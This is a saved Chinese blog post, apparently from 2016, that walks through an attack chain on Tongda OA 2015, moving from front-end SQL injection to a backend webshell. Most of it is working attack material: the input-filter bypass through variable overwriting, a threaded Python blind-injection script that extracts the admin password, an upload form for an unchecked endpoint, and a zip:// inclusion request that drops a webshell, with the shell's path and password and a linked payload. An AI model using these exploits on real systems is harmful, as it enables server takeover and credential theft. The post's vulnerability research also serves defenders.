@@ -1,0 +1,422 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>2015通达oa-从前台注入到后台getshell - l3m0n - 博客园</title>
+<link href="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/tongdaoa_2015_sql_getshell.html" id="cb_post_title_url">2015通达oa-从前台注入到后台getshell</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>最近做众测的时候遇上的一个系统，2015版本的最新更新日期：2016-07-22</p>
+<h3 id="注入分析">注入分析</h3>
+<p>\inc\common.inc.php</p>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">&lt;?php</span>
+
+<span class="kw">function</span> SecureRequest<span class="ot">(</span>&amp;<span class="kw">$var</span><span class="ot">)</span>
+{
+    <span class="kw">if</span> <span class="ot">(</span><span class="fu">is_array</span><span class="ot">(</span><span class="kw">$var</span><span class="ot">))</span> {
+        <span class="kw">foreach</span> <span class="ot">(</span><span class="kw">$var</span> <span class="kw">as</span> <span class="kw">$_k</span> =&gt; <span class="kw">$_v</span> <span class="ot">)</span> {
+            <span class="kw">$var</span><span class="ot">[</span><span class="kw">$_k</span><span class="ot">]</span> = securerequest<span class="ot">(</span><span class="kw">$_v</span><span class="ot">);</span>
+        }
+    }
+    <span class="kw">else</span> {
+        <span class="kw">if</span> <span class="ot">((</span><span class="dv">0</span> &lt; <span class="fu">strlen</span><span class="ot">(</span><span class="kw">$var</span><span class="ot">))</span> &amp;&amp; <span class="fu">preg_match</span><span class="ot">(</span><span class="st">"#^(MYOA_|GLOBALS|_GET|_POST|_COOKIE|_ENV|_SERVER|_FILES|_SESSION)#"</span><span class="ot">,</span> <span class="kw">$var</span><span class="ot">))</span> {
+            <span class="fu">exit</span><span class="ot">(</span><span class="st">"Invalid Parameters!"</span><span class="ot">);</span>
+        }
+
+        <span class="kw">if</span> <span class="ot">(</span>!<span class="fu">get_magic_quotes_gpc</span><span class="ot">())</span> {
+            <span class="kw">$var</span> = <span class="fu">addslashes</span><span class="ot">(</span><span class="kw">$var</span><span class="ot">);</span>
+        }
+    }
+
+    <span class="kw">return</span> <span class="kw">$var</span><span class="ot">;</span>
+}
+
+<span class="kw">function</span> CheckRequest<span class="ot">(</span>&amp;<span class="kw">$val</span><span class="ot">)</span>
+{
+    <span class="kw">if</span> <span class="ot">(</span><span class="fu">is_array</span><span class="ot">(</span><span class="kw">$val</span><span class="ot">))</span> {
+        <span class="kw">foreach</span> <span class="ot">(</span><span class="kw">$val</span> <span class="kw">as</span> <span class="kw">$_k</span> =&gt; <span class="kw">$_v</span> <span class="ot">)</span> {
+            checkrequest<span class="ot">(</span><span class="kw">$_k</span><span class="ot">);</span>
+            checkrequest<span class="ot">(</span><span class="kw">$val</span><span class="ot">[</span><span class="kw">$_k</span><span class="ot">]);</span>
+        }
+    }
+    <span class="kw">else</span> {
+        <span class="kw">if</span> <span class="ot">((</span><span class="dv">0</span> &lt; <span class="fu">strlen</span><span class="ot">(</span><span class="kw">$val</span><span class="ot">))</span> &amp;&amp; <span class="fu">preg_match</span><span class="ot">(</span><span class="st">"#^(MYOA_|GLOBALS|_GET|_POST|_COOKIE|_ENV|_SERVER|_FILES|_SESSION)#"</span><span class="ot">,</span> <span class="kw">$val</span><span class="ot">))</span> {
+            <span class="fu">exit</span><span class="ot">(</span><span class="st">"Invalid Parameters!"</span><span class="ot">);</span>
+        }
+    }
+}
+
+<span class="kw">function</span> RemoveXSS<span class="ot">(</span><span class="kw">$val</span><span class="ot">)</span>
+{
+    <span class="kw">if</span> <span class="ot">(</span><span class="fu">is_array</span><span class="ot">(</span><span class="kw">$val</span><span class="ot">))</span> {
+        <span class="kw">foreach</span> <span class="ot">(</span><span class="kw">$val</span> <span class="kw">as</span> <span class="kw">$key</span> =&gt; <span class="kw">$val</span> <span class="ot">)</span> {
+            <span class="kw">$val</span><span class="ot">[</span><span class="kw">$key</span><span class="ot">]</span> = removexss<span class="ot">(</span><span class="kw">$val</span><span class="ot">);</span>
+        }
+    }
+
+    <span class="kw">$val</span> = <span class="fu">preg_replace</span><span class="ot">(</span><span class="st">"/([</span><span class="kw">\\</span><span class="st">x00-</span><span class="kw">\\</span><span class="st">x08,</span><span class="kw">\\</span><span class="st">x0b-</span><span class="kw">\\</span><span class="st">x0c,</span><span class="kw">\\</span><span class="st">x0e-</span><span class="kw">\\</span><span class="st">x19])/"</span><span class="ot">,</span> <span class="st">""</span><span class="ot">,</span> <span class="kw">$val</span><span class="ot">);</span>
+    <span class="kw">$ra</span> = <span class="fu">array</span><span class="ot">(</span><span class="st">"javascript"</span><span class="ot">,</span> <span class="st">"vbscript"</span><span class="ot">,</span> <span class="st">"expression"</span><span class="ot">,</span> <span class="st">"script"</span><span class="ot">,</span> <span class="st">"iframe"</span><span class="ot">,</span> <span class="st">"frame"</span><span class="ot">,</span> <span class="st">"onerror"</span><span class="ot">,</span> <span class="st">"onload"</span><span class="ot">,</span> <span class="st">"onmousemove"</span><span class="ot">,</span> <span class="st">"onmouseout"</span><span class="ot">,</span> <span class="st">"onmouseover"</span><span class="ot">,</span> <span class="st">"onmove"</span><span class="ot">,</span> <span class="st">"onmovestart"</span><span class="ot">);</span>
+    <span class="kw">$found</span> = <span class="kw">true</span><span class="ot">;</span>
+
+    <span class="kw">while</span> <span class="ot">(</span><span class="kw">$found</span> == <span class="kw">true</span><span class="ot">)</span> {
+        <span class="kw">$val_before</span> = <span class="kw">$val</span><span class="ot">;</span>
+
+        <span class="kw">for</span> <span class="ot">(</span><span class="kw">$i</span> = <span class="dv">0</span><span class="ot">;</span> <span class="kw">$i</span> &lt; <span class="fu">sizeof</span><span class="ot">(</span><span class="kw">$ra</span><span class="ot">);</span> <span class="kw">$i</span>++<span class="ot">)</span> {
+            <span class="kw">$pattern</span> = <span class="st">"/"</span><span class="ot">;</span>
+
+            <span class="kw">for</span> <span class="ot">(</span><span class="kw">$j</span> = <span class="dv">0</span><span class="ot">;</span> <span class="kw">$j</span> &lt; <span class="fu">strlen</span><span class="ot">(</span><span class="kw">$ra</span><span class="ot">[</span><span class="kw">$i</span><span class="ot">]);</span> <span class="kw">$j</span>++<span class="ot">)</span> {
+                <span class="kw">if</span> <span class="ot">(</span><span class="dv">0</span> &lt; <span class="kw">$j</span><span class="ot">)</span> {
+                    <span class="kw">$pattern</span> .= <span class="st">"("</span><span class="ot">;</span>
+                    <span class="kw">$pattern</span> .= <span class="st">"(&amp;#[xX]0{0,8}([9ab]);)"</span><span class="ot">;</span>
+                    <span class="kw">$pattern</span> .= <span class="st">"|"</span><span class="ot">;</span>
+                    <span class="kw">$pattern</span> .= <span class="st">"|(&amp;#0{0,8}([9|10|13]);)"</span><span class="ot">;</span>
+                    <span class="kw">$pattern</span> .= <span class="st">")*"</span><span class="ot">;</span>
+                }
+
+                <span class="kw">$pattern</span> .= <span class="kw">$ra</span><span class="ot">[</span><span class="kw">$i</span><span class="ot">][</span><span class="kw">$j</span><span class="ot">];</span>
+            }
+
+            <span class="kw">$pattern</span> .= <span class="st">"/i"</span><span class="ot">;</span>
+            <span class="kw">$replacement</span> = <span class="fu">substr</span><span class="ot">(</span><span class="kw">$ra</span><span class="ot">[</span><span class="kw">$i</span><span class="ot">],</span> <span class="dv">0</span><span class="ot">,</span> <span class="dv">2</span><span class="ot">)</span> . <span class="st">" "</span> . <span class="fu">substr</span><span class="ot">(</span><span class="kw">$ra</span><span class="ot">[</span><span class="kw">$i</span><span class="ot">],</span> <span class="dv">2</span><span class="ot">);</span>
+            <span class="kw">$val</span> = <span class="fu">preg_replace</span><span class="ot">(</span><span class="kw">$pattern</span><span class="ot">,</span> <span class="kw">$replacement</span><span class="ot">,</span> <span class="kw">$val</span><span class="ot">);</span>
+
+            <span class="kw">if</span> <span class="ot">(</span><span class="kw">$val_before</span> == <span class="kw">$val</span><span class="ot">)</span> {
+                <span class="kw">$found</span> = <span class="kw">false</span><span class="ot">;</span>
+            }
+        }
+    }
+
+    <span class="kw">return</span> <span class="kw">$val</span><span class="ot">;</span>
+}
+
+checkrequest<span class="ot">(</span><span class="kw">$_REQUEST</span><span class="ot">);</span>
+
+<span class="kw">if</span> <span class="ot">(</span><span class="dv">0</span> &lt; <span class="fu">count</span><span class="ot">(</span><span class="kw">$_COOKIE</span><span class="ot">))</span> {
+    <span class="kw">foreach</span> <span class="ot">(</span><span class="kw">$_COOKIE</span> <span class="kw">as</span> <span class="kw">$s_key</span> =&gt; <span class="kw">$s_value</span> <span class="ot">)</span> {
+        <span class="kw">$_COOKIE</span><span class="ot">[</span><span class="kw">$s_key</span><span class="ot">]</span> = <span class="fu">strip_tags</span><span class="ot">(</span>securerequest<span class="ot">(</span><span class="kw">$s_value</span><span class="ot">));</span>
+        <span class="kw">$$s_key</span> = <span class="kw">$_COOKIE</span><span class="ot">[</span><span class="kw">$s_key</span><span class="ot">];</span>
+    }
+
+    <span class="fu">reset</span><span class="ot">(</span><span class="kw">$_COOKIE</span><span class="ot">);</span>
+}
+
+<span class="kw">if</span> <span class="ot">(</span><span class="dv">0</span> &lt; <span class="fu">count</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">))</span> {
+    <span class="kw">$arr_html_fields</span> = <span class="fu">array</span><span class="ot">();</span>
+
+    <span class="kw">foreach</span> <span class="ot">(</span><span class="kw">$_POST</span> <span class="kw">as</span> <span class="kw">$s_key</span> =&gt; <span class="kw">$s_value</span> <span class="ot">)</span> {
+        <span class="kw">if</span> <span class="ot">(</span><span class="fu">substr</span><span class="ot">(</span><span class="kw">$s_key</span><span class="ot">,</span> <span class="dv">0</span><span class="ot">,</span> <span class="dv">15</span><span class="ot">)</span> != <span class="st">"TD_HTML_EDITOR_"</span><span class="ot">)</span> {
+            <span class="kw">if</span> <span class="ot">(</span><span class="fu">is_array</span><span class="ot">(</span><span class="kw">$s_value</span><span class="ot">))</span> {
+                <span class="kw">$_POST</span><span class="ot">[</span><span class="kw">$s_key</span><span class="ot">]</span> = securerequest<span class="ot">(</span><span class="kw">$s_value</span><span class="ot">);</span>
+            }
+            <span class="kw">else</span> {
+                <span class="kw">$_POST</span><span class="ot">[</span><span class="kw">$s_key</span><span class="ot">]</span> = <span class="fu">strip_tags</span><span class="ot">(</span>securerequest<span class="ot">(</span><span class="kw">$s_value</span><span class="ot">));</span>
+            }
+
+            <span class="kw">$$s_key</span> = <span class="kw">$_POST</span><span class="ot">[</span><span class="kw">$s_key</span><span class="ot">];</span>
+        }
+        <span class="kw">else</span> {
+            <span class="fu">unset</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="kw">$s_key</span><span class="ot">]);</span>
+            <span class="kw">$s_key</span> = <span class="fu">substr</span><span class="ot">(</span><span class="kw">$s_key</span><span class="ot">,</span> <span class="dv">15</span><span class="ot">);</span>
+            <span class="kw">$$s_key</span> = securerequest<span class="ot">(</span><span class="kw">$s_value</span><span class="ot">);</span>
+            <span class="kw">$arr_html_fields</span><span class="ot">[</span><span class="kw">$s_key</span><span class="ot">]</span> = <span class="kw">$$s_key</span><span class="ot">;</span>
+        }
+    }
+
+    <span class="fu">reset</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">);</span>
+    <span class="kw">$_POST</span> = <span class="fu">array_merge</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">,</span> <span class="kw">$arr_html_fields</span><span class="ot">);</span>
+}
+
+<span class="kw">if</span> <span class="ot">(</span><span class="dv">0</span> &lt; <span class="fu">count</span><span class="ot">(</span><span class="kw">$_GET</span><span class="ot">))</span> {
+    <span class="kw">foreach</span> <span class="ot">(</span><span class="kw">$_GET</span> <span class="kw">as</span> <span class="kw">$s_key</span> =&gt; <span class="kw">$s_value</span> <span class="ot">)</span> {
+        <span class="kw">$_GET</span><span class="ot">[</span><span class="kw">$s_key</span><span class="ot">]</span> = <span class="fu">strip_tags</span><span class="ot">(</span>securerequest<span class="ot">(</span><span class="kw">$s_value</span><span class="ot">));</span>
+        <span class="kw">$$s_key</span> = <span class="kw">$_GET</span><span class="ot">[</span><span class="kw">$s_key</span><span class="ot">];</span>
+    }
+
+    <span class="fu">reset</span><span class="ot">(</span><span class="kw">$_GET</span><span class="ot">);</span>
+}
+
+<span class="fu">unset</span><span class="ot">(</span><span class="kw">$s_key</span><span class="ot">);</span>
+<span class="fu">unset</span><span class="ot">(</span><span class="kw">$s_value</span><span class="ot">);</span></code></pre></div>
+<p>逻辑分析一下，<br/>
+CheckRequest函数去检查<code>$_REQUEST</code>，通达oa是环境程序一体安装等，php版本是5.3.29，这个时候的<code>$_REQUEST</code>不包含<code>$_COOKIE</code>的，所以可以通过cookie来覆盖变量。</p>
+<p>但是有一个很蛋疼的东西就是</p>
+<pre><code>$_COOKIE[$s_key] = strip_tags(securerequest($s_value));</code></pre>
+<p><code>strip_tags</code>是没办法处理数组的，所以会返回null，故想覆盖比如<code>_SESSION['a']</code>的话，是没办法的。</p>
+<p>接下来看后面的<code>$_COOKIE</code>-&gt;<code>$_POST</code>-&gt;<code>$_GET</code>，这些都是用SecureRequest函数去检查。然而这个函数只检查了数组键值，＝。＝，然后还不允许这样以_GET、_POST等<strong>开头</strong>变量覆盖</p>
+<pre><code>preg_match("#^(MYOA_|GLOBALS|_GET|_POST|_COOKIE|_ENV|_SERVER|_FILES|_SESSION)#", $var)</code></pre>
+<p>看到这段对$_post的处理</p>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php">        <span class="kw">if</span> <span class="ot">(</span><span class="fu">substr</span><span class="ot">(</span><span class="kw">$s_key</span><span class="ot">,</span> <span class="dv">0</span><span class="ot">,</span> <span class="dv">15</span><span class="ot">)</span> != <span class="st">"TD_HTML_EDITOR_"</span><span class="ot">)</span> {
+            xxx
+        }
+        <span class="kw">else</span> {
+            <span class="fu">unset</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="kw">$s_key</span><span class="ot">]);</span>
+            <span class="kw">$s_key</span> = <span class="fu">substr</span><span class="ot">(</span><span class="kw">$s_key</span><span class="ot">,</span> <span class="dv">15</span><span class="ot">);</span>
+            <span class="kw">$$s_key</span> = securerequest<span class="ot">(</span><span class="kw">$s_value</span><span class="ot">);</span>
+            <span class="kw">$arr_html_fields</span><span class="ot">[</span><span class="kw">$s_key</span><span class="ot">]</span> = <span class="kw">$$s_key</span><span class="ot">;</span>
+        }</code></pre></div>
+<p>＝。＝，如果传过去一个<code>TD_HTML_EDITOR__SESSION[a]=1</code>，最后不就成了<code>_SESSION[a]=1</code>，还顺便绕过了上面的正则检查。</p>
+<p>注入很多，用的是80sec的waf，比如</p>
+<p><a class="uri" href="http://lemon.love:8081/general/document/index.php/send/approve/finish">http://lemon.love:8081/general/document/index.php/send/approve/finish</a></p>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php">    <span class="kw">public</span> <span class="kw">function</span> approve_finish<span class="ot">()</span>
+    {
+        <span class="kw">$CUR_USER_ID</span> = <span class="kw">$_SESSION</span><span class="ot">[</span><span class="st">"LOGIN_USER_ID"</span><span class="ot">];</span>
+        <span class="kw">$sid</span> = <span class="kw">$this</span>-&gt;input-&gt;post<span class="ot">(</span><span class="st">"sid"</span><span class="ot">);</span>
+        <span class="kw">$sid</span> = <span class="fu">rtrim</span><span class="ot">(</span><span class="kw">$sid</span><span class="ot">,</span> <span class="st">","</span><span class="ot">);</span>
+        <span class="kw">$sql</span> = <span class="st">"select sid,user_list from doc_send_data where cur_user='</span><span class="kw">$CUR_USER_ID</span><span class="st">' and status='2' and sid in(</span><span class="kw">$sid</span><span class="st">)"</span><span class="ot">;</span>
+        <span class="kw">$query</span> = <span class="kw">$this</span>-&gt;db-&gt;query<span class="ot">(</span><span class="kw">$sql</span><span class="ot">);</span></code></pre></div>
+<p>bypass出数据：</p>
+<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> threading,time
+<span class="im">import</span> requests
+
+url <span class="op">=</span> <span class="st">"http://lemon.love:8081/general/document/index.php/send/approve/finish"</span>
+
+<span class="kw">def</span> exp(n):
+    <span class="kw">global</span> data
+    <span class="cf">for</span> c <span class="op">in</span> <span class="bu">range</span>(<span class="dv">33</span>,<span class="dv">127</span>):
+        i <span class="op">=</span> c
+        flag <span class="op">=</span> <span class="dv">1</span>
+        payload <span class="op">=</span> <span class="st">"1) and char(@`'`)  union select if(ord(mid(PASSWORD,</span><span class="sc">%d</span><span class="st">,1))=</span><span class="sc">%d</span><span class="st">,sleep(8),1),1 from user WHERE BYNAME = 0x61646d696e #and char(@`'`)"</span> <span class="op">%</span> (n,i)
+        exp_data <span class="op">=</span> {
+            <span class="st">'sid'</span> : payload
+        }
+        cookies <span class="op">=</span> {
+            <span class="st">'_SERVER'</span> : <span class="st">''</span>
+        }
+        <span class="cf">try</span>:
+            res <span class="op">=</span> requests.post(url, data<span class="op">=</span>exp_data, cookies<span class="op">=</span>cookies, timeout<span class="op">=</span><span class="dv">5</span>)
+        <span class="cf">except</span>:
+            data[n] <span class="op">=</span> <span class="bu">chr</span>(i)
+            <span class="bu">print</span> <span class="st">"Data </span><span class="sc">%d</span><span class="st">th: </span><span class="sc">%s</span><span class="st">"</span> <span class="op">%</span> (n,data[n])
+            flag <span class="op">=</span> <span class="dv">0</span>
+            <span class="cf">break</span>
+    <span class="cf">if</span> flag:
+        exit()
+
+<span class="kw">def</span> main():
+    threadpool<span class="op">=</span>[]
+
+    <span class="cf">for</span> n <span class="op">in</span> <span class="bu">xrange</span>(<span class="dv">1</span>,<span class="dv">10</span>):
+        th <span class="op">=</span> threading.Thread(target<span class="op">=</span>exp,args<span class="op">=</span> (n,))
+        threadpool.append(th)
+
+    <span class="cf">for</span> th <span class="op">in</span> threadpool:
+        th.start()
+
+    <span class="cf">for</span> th <span class="op">in</span> threadpool :
+        threading.Thread.join(th)
+
+<span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">'__main__'</span>:
+    data <span class="op">=</span> {}
+    start_time <span class="op">=</span> time.time()
+    main()
+    <span class="bu">print</span> <span class="st">"Get data: "</span>,data
+    <span class="bu">print</span> <span class="st">"Spend time: "</span>,time.time()<span class="op">-</span>start_time
+    <span class="cf">for</span> i <span class="op">in</span> <span class="bu">sorted</span>(data):
+        <span class="bu">print</span> data[i],</code></pre></div>
+<p>这样就可以跑出管理员密码，这个是用unix加密的，放cmd5解密一下就好了。</p>
+<h3 id="上传包含getshell">上传+包含=&gt;getshell</h3>
+<p>general\reportshop\utils\upload.php</p>
+<p>上传没验证，然后又可以变量覆盖。所以可以直接上传一个php。</p>
+<p>exp.html</p>
+<div class="sourceCode"><pre class="sourceCode html"><code class="sourceCode html"><span class="kw">&lt;form</span><span class="ot"> action=</span><span class="st">"http://lemon.love:8081/general/reportshop/utils/upload.php?action=upload</span><span class="er">&amp;</span><span class="st">filetype=xls"</span><span class="ot"> method=</span><span class="st">"POST"</span><span class="ot"> enctype=</span><span class="st">"multipart/form-data"</span><span class="kw">&gt;</span>
+    <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">"file"</span><span class="ot"> value=</span><span class="st">""</span><span class="ot"> name=</span><span class="st">"FILE1"</span><span class="kw">&gt;</span>
+    <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">"submit"</span><span class="ot"> value=</span><span class="st">"submit"</span><span class="ot"> name=</span><span class="st">"submit"</span><span class="kw">&gt;</span>
+<span class="kw">&lt;/form&gt;</span></code></pre></div>
+<p>上传的地址是：<code>xxx/attachment/reportshop/templates/upload.php</code></p>
+<p>但是因为环境是一体的，所以这些上传的目录并没有执行权限。</p>
+<p>看到这段运行的。</p>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">function</span> delete_file<span class="ot">(</span><span class="kw">$url</span><span class="ot">)</span>
+{
+    <span class="kw">$url</span> .= <span class="st">"general/reportshop/utils/upload.php?cluster=&amp;action="</span> . <span class="kw">$_POST</span><span class="ot">[</span><span class="st">"action"</span><span class="ot">]</span> . <span class="st">"&amp;filetype="</span> . <span class="kw">$_POST</span><span class="ot">[</span><span class="st">"filetype"</span><span class="ot">]</span> . <span class="st">"&amp;filename=</span><span class="kw">{$_POST["filename"]}</span><span class="st">"</span><span class="ot">;</span>
+    <span class="kw">include</span> <span class="ot">(</span><span class="kw">$url</span><span class="ot">);</span>
+}
+
+其中是这样调用的
+
+<span class="kw">else</span> <span class="kw">if</span> <span class="ot">(</span><span class="kw">$action</span> == <span class="st">"unupload"</span><span class="ot">)</span> {
+    <span class="kw">if</span> <span class="ot">(</span><span class="kw">$filetype</span> == <span class="st">"xls"</span><span class="ot">)</span> {
+        xx<span class="ot">;</span>
+    }
+    <span class="kw">else</span> <span class="kw">if</span> <span class="ot">(</span><span class="kw">$filetype</span> == <span class="st">"img"</span><span class="ot">)</span> {
+        xx<span class="ot">;</span>
+    }
+    <span class="kw">else</span> <span class="kw">if</span> <span class="ot">(</span><span class="kw">$filetype</span> == <span class="st">"attach"</span><span class="ot">)</span> {
+        <span class="kw">$uploaddir</span> = <span class="kw">MYOA_ATTACH_PATH</span> . <span class="st">"reportshop/attachment/"</span> . <span class="fu">trim</span><span class="ot">(</span><span class="kw">$filename</span><span class="ot">);</span>
+
+        <span class="kw">if</span> <span class="ot">(</span><span class="fu">is_file</span><span class="ot">(</span><span class="kw">$uploaddir</span><span class="ot">))</span> {
+            <span class="fu">unlink</span><span class="ot">(</span><span class="kw">$uploaddir</span><span class="ot">);</span>
+
+            <span class="kw">if</span> <span class="ot">(</span>!<span class="fu">isset</span><span class="ot">(</span><span class="kw">$cluster</span><span class="ot">))</span> {
+                <span class="kw">foreach</span> <span class="ot">(</span><span class="kw">$arr_erp_server</span> <span class="kw">as</span> <span class="kw">$s_server</span> <span class="ot">)</span> {
+                    delete_file<span class="ot">(</span><span class="kw">$s_server</span><span class="ot">);</span>
+                }
+            }
+        }
+    }
+}</code></pre></div>
+<p>所以是这样的一个情况，</p>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">&lt;?php</span>
+<span class="kw">include</span> <span class="kw">$_GET</span><span class="ot">[</span><span class="dv">1</span><span class="ot">]</span> . <span class="st">"general/reportshop/utils/upload.php?cluster=&amp;action="</span> . <span class="kw">$_POST</span><span class="ot">[</span><span class="st">"action"</span><span class="ot">]</span> . <span class="st">"&amp;filetype="</span> . <span class="kw">$_POST</span><span class="ot">[</span><span class="st">"filetype"</span><span class="ot">]</span> . <span class="st">"&amp;filename=</span><span class="kw">{$_POST["filename"]}</span><span class="st">"</span><span class="ot">;</span></code></pre></div>
+<p>这样的包含，可以利用zip、phar协议，但是后面还有<code>?&amp;=</code>等符号，一个文件也没发这样创建。</p>
+<p>先创建一个upload.....(很多.).php，然后在winhex里面修改它为</p>
+<p><img src="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/804631-20161216111927433-2126957293.png"/></p>
+<p>这样zip协议包含的时候就可以包含到这个文件了。</p>
+<p>整理一下利用过程：</p>
+<ol>
+<li>先上传zip文件，里面包含payload</li>
+<li>再上传一个1.txt文件(任意内容都可以，主要是为了进入include包含里面的条件)</li>
+<li>进行包含</li>
+</ol>
+<pre><code>http://lemon.love:8081/general/reportshop/utils/upload.de.php?action=unupload&amp;filename=../templates/1.txt&amp;filetype=attach
+
+post数据：注意路径在进入后台后有一个系统信息可看到路径
+
+TD_HTML_EDITOR_arr_erp_server[aaa]=zip://C:\WWW\code-src\myoa\webroot\attachment\reportshop\templates\kk123.zip%23</code></pre>
+<p><a href="http://files.cnblogs.com/files/iamstudy/kk123.zip">kk123.zip</a></p>
+<p>这个zip包含后会生成一个shell，地址是</p>
+<pre><code>http://lemon.love:8081/general/reportshop/utils/l.php
+password：kk123</code></pre>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2016-12-16 11:22</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6186146" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6186146);return false;">收藏</a></div>
+</div>
+<script src="./2015通达oa-从前台注入到后台getshell - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6186146,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/12/16 11:22:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
